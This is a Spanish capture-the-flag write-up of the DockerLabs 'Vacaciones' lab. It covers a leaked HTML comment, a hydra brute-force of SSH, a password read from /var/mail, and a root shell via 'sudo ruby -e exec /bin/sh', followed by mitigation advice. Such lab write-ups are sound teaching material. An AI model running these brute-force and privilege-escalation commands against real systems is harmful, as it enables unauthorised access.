---
layout: writeups
title: "Vacaciones"
platform: dockerlabs
difficulty: muy-facil
date: 2026-10-27
permalink: /writeups/dockerlabs/vacaciones/
ip: 172.17.0.2
os: Linux
tools: [nmap, hydra, ssh, sudo, ruby]
source_url: https://dockerlabs.es/   # cambia esto por el enlace directo a la máquina cuando lo tengas
description: "Máquina fácil de DockerLabs: un comentario HTML filtra dos nombres de usuario, fuerza bruta por SSH con hydra da pie de entrada, un correo en /var/mail revela la contraseña del segundo usuario, y un permiso sudo sobre ruby permite escalar a root."
---

**Vacaciones** es una máquina <span class="tag tag-green">muy fácil</span> con una cadena muy didáctica: una pista escondida en el código fuente, <span class="tag tag-yellow">fuerza bruta</span> a SSH, movimiento lateral leyendo el correo de otro usuario y una escalada clásica de <span class="tag tag-red">sudo mal configurado</span> sobre un intérprete.

## Despliegue

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — kali@kali:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">cd vacaciones</div>
    <div class="t-cmd">sudo bash auto_deploy.sh vacaciones.tar</div>
    <div class="t-out">Estamos desplegando la máquina vulnerable, espere un momento.</div>
    <div class="t-ok">Máquina desplegada, su dirección IP es → 172.17.0.2</div>
  </div>
</div>

## Enumeración

### Puerto 80 — una pista escondida

`http://172.17.0.2` carga una página completamente en blanco. Nada a la vista... hasta que miramos el código fuente (<kbd>Ctrl</kbd>+<kbd>U</kbd>):

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">view-source:http://172.17.0.2/</span>
  </div>
  <div class="terminal-body">
    <div class="t-warn">&lt;!-- De: Juan Para: Camilo, te he dejado un correo es importante... --&gt;</div>
  </div>
</div>

Un comentario HTML que no debería estar en producción nos regala dos cosas: dos nombres de usuario (**juan** y **camilo**) y la pista de que hay un correo esperando en algún sitio.

### Escaneo de puertos

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — kali@kali:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">sudo nmap -p- --min-rate 5000 -n -Pn 172.17.0.2</div>
    <div class="t-ok">22/tcp open ssh</div>
    <div class="t-ok">80/tcp open http</div>
  </div>
</div>

Solo SSH y HTTP. Sin más servicios que picar, el camino está claro: usar los usuarios filtrados contra el SSH.

## Explotación — acceso inicial

### Fuerza bruta contra SSH

Con el usuario `camilo` como candidato, probamos con `hydra` y el clásico `rockyou.txt`:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — kali@kali:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I -f</div>
    <div class="t-out">[DATA] attacking ssh://172.17.0.2:22</div>
    <div class="t-ok">[22][ssh] host: 172.17.0.2   login: camilo   password: password1</div>
    <div class="t-out">1 of 1 target successfully completed, 1 valid password found</div>
  </div>
</div>

Contraseña débil, cae a la primera. Entramos:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — camilo@vacaciones:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">ssh camilo@172.17.0.2</div>
    <div class="t-cmd">whoami</div>
    <div class="t-out">camilo</div>
  </div>
</div>

### Movimiento lateral: de camilo a juan

El comentario del principio decía que Juan le había dejado un correo a Camilo. En Linux el correo local de cada usuario se guarda en `/var/mail`:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — camilo@vacaciones:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">cd /var/mail</div>
    <div class="t-cmd">ls</div>
    <div class="t-out">camilo</div>
    <div class="t-cmd">cd camilo</div>
    <div class="t-cmd">ls</div>
    <div class="t-out">correo.txt</div>
    <div class="t-cmd">cat correo.txt</div>
    <div class="t-out">Hola Camilo,</div>
    <div class="t-out">Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.</div>
    <div class="t-ok">Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb</div>
  </div>
</div>

Juan le dejó su contraseña a Camilo por si el jefe la pedía. Mala idea: probamos a saltar de usuario.

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — juan@vacaciones:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">ssh juan@172.17.0.2</div>
    <div class="t-cmd">whoami</div>
    <div class="t-out">juan</div>
  </div>
</div>

## Escalada de privilegios

Lo típico primero, probar `su` directo:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — juan@vacaciones:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">sudo su</div>
    <div class="t-err">Sorry, user juan is not allowed to execute '/bin/su' as root.</div>
  </div>
</div>

No por ahí. Miramos qué sí puede ejecutar `juan` con privilegios:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — juan@vacaciones:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">sudo -l</div>
    <div class="t-warn">User juan may run the following commands:</div>
    <div class="t-warn">&nbsp;&nbsp;(ALL) NOPASSWD: /usr/bin/ruby</div>
  </div>
</div>

`ruby` sin contraseña y sin restricciones de argumentos. Un vistazo rápido a <a href="https://gtfobins.github.io/gtfobins/ruby/" target="_blank" rel="noopener">GTFOBins</a> confirma que basta con pedirle que ejecute una shell:

<div class="terminal">
  <div class="terminal-bar">
    <div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div>
    <span class="terminal-title">bash — root@vacaciones:~</span>
  </div>
  <div class="terminal-body">
    <div class="t-cmd">sudo ruby -e 'exec "/bin/sh"'</div>
    <div class="t-cmd">whoami</div>
    <div class="t-ok">root</div>
  </div>
</div>

Root confirmado.

<h2>Cadena de ataque — resumen</h2>

<ol>
  <li><strong>Recon web</strong> → la web está vacía, pero el código fuente filtra dos usuarios (<code>juan</code>, <code>camilo</code>) y menciona un correo.</li>
  <li><strong>Fuerza bruta</strong> → <code>hydra</code> contra SSH con <code>camilo</code> y <code>rockyou.txt</code> → <code>camilo:password1</code>.</li>
  <li><strong>Movimiento lateral</strong> → <code>/var/mail/camilo/correo.txt</code> contiene la contraseña de <code>juan</code>.</li>
  <li><strong>Escalada</strong> → <code>sudo -l</code> revela <code>/usr/bin/ruby</code> como <code>NOPASSWD</code> → <code>sudo ruby -e 'exec "/bin/sh"'</code> → root.</li>
</ol>

<h2>Mitigación</h2>

<ul>
  <li>No dejar comentarios de depuración ni notas internas en el HTML servido en producción.</li>
  <li>Forzar contraseñas robustas y, si es posible, autenticación por clave pública en SSH para frenar la fuerza bruta.</li>
  <li>Nunca guardar contraseñas en texto plano en correos, ficheros o <code>/var/mail</code> — ni siquiera "por si acaso".</li>
  <li>Revisar <code>sudo -l</code> para cada usuario y evitar dar <code>NOPASSWD</code> a intérpretes genéricos (<code>ruby</code>, <code>python</code>, <code>perl</code>, <code>bash</code>...): casi todos permiten escapar a una shell con privilegios (<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>).</li>
</ul>

<hr>

<p><em>Nota: en estas capturas no quedó registrada la lectura de <code>user.txt</code> / <code>root.txt</code>. Si las tienes, pásamelas y las añado a la sección de flags.</em></p>

<h2>Certificado</h2>

<div class="glass-card" style="text-align:center; padding:1.5rem;">
  <img src="/assets/img/writeups/dockerlabs/vacaciones-diploma.png" alt="Diploma de finalización del laboratorio Vacaciones — DockerLabs" style="border:none; margin:0 0 1.1rem; border-radius:10px; max-width:100%;">
  <div class="wu-meta" style="justify-content:center;">
    <span class="wu-meta-item">📅 30/10/2026</span>
    <span class="wu-meta-item">🆔 DL-2AF813</span>
    <span class="wu-meta-item"><a href="https://dockerlabs.es" target="_blank" rel="noopener">dockerlabs.es</a></span>
  </div>
</div>
